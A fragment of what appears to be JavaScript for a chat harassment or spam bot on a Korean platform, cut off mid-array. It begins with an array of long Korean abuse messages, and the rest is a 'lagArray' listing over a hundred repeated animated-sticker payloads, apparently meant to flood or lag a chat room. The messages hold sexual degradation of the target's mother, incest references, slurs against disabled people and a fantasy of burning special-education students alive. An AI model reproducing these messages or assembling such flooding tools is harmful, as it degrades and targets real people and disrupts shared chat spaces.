    "느그 장애인 애비한테는 쫄아서 암말도 못하고 쳐맞고 질질 짜면서 넷상와서 온갖 가오란 가오는 다잡는게 많이 역겹고 추잡스럽고 더럽다.. 집에서 애니보고 딸딸이치고 느그엄마가 젤 좋아하는 옷 가져다가 정액 쿠퍼액 닦는 시~발 패륜아새끼~~!",
    "장애인 버러지 느금마 개보지 창녀보지련아 느그어매가 그다구로 가르쳐서 니가 그따구로 사는것도 있는데 니새끼가 병신같이 애미 때리고 애미한테 욕박으니까 느그애미가 니를 그렇게 가르친거야 병신련아 그게 니 수준이고 그게 니 한계야 거지련아 진짜 좆나대네 시발년이 느금마 보지 찢어가지고 오나홀로 쓰면 니는 그걸 보고 딸치겠지?",
    "느금마보지 장애인보지 찢어다가 성인용품가게에 오나홀로 팔아재끼면 1000원도 안나오구요 븅신아~ 느그애비 P2P 사이트에서 야동 다운받다가 좀비PC 된련아~ 니 자지 찢어지는 소리 뿌직 자지에서 똥나오네 개더러운 버러시새끼야~",
    "느그어매 똥싸고 오줌싸고 후장에서 양수 질질 흘러나오는거 도촬해가지고 딸딸이치는 딸잡이 그랜드마스터 더러운 시발새끼야~ 맨날 느그어매 잘때 다리 벌리고 자면은 보짓가랑이 바라보면서 팬디 벗길까~ 말까~ 이지랄떠는 잠재적 성범죄자 시발 근친물 좋아하는 씹 오타쿠새끼야 ㅋㅋㅋ 나가뒤져!!!! 시발 이병신 개좆찌끄러기샛기야~",
    "생긴거는 호모사피엔스랑 네안데르탈인의 이종교배로 만들어진 개외계인새끼 시발년아 ㅋㅋㅋㅋ 이마랑 광대뼈 존나 튀어나와있고 코는 존나 크고 입이 돌출된 전형적인 원숭이새끼 그래놓고 정신연령도 낮아가지고 시발 개찐따마냥 애니캐릭터 그려진 옷 입고 다니는 사회부적응자 시발년아~",
    "어떻게든지 지 빡친거 풀어보려고 개샛기가 염병하면서 긴장해가지고 침 꼴까닥 삼키고 개샛기 븅신마냥 빠나올 생각만 하는 전형적인 찐따새끼야~ 느금마 보짓구녕이랑 똥구녕 잘떄 석고해가지고 리얼돌에다가 갖다붙혀놓고 딸치는 시발 더러운새끼 난 너같은 새끼만 보면 역겹고 추잡스럽고 더러워가지고 특수반새끼랑 같이 앉혀놓고 오순도순 모아놔가지고 화염방사기로 지져버리고싶어 ㅋㅋㅋ"
]

let lagArray = [
    { t: 1, ct: "", jct: "" },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
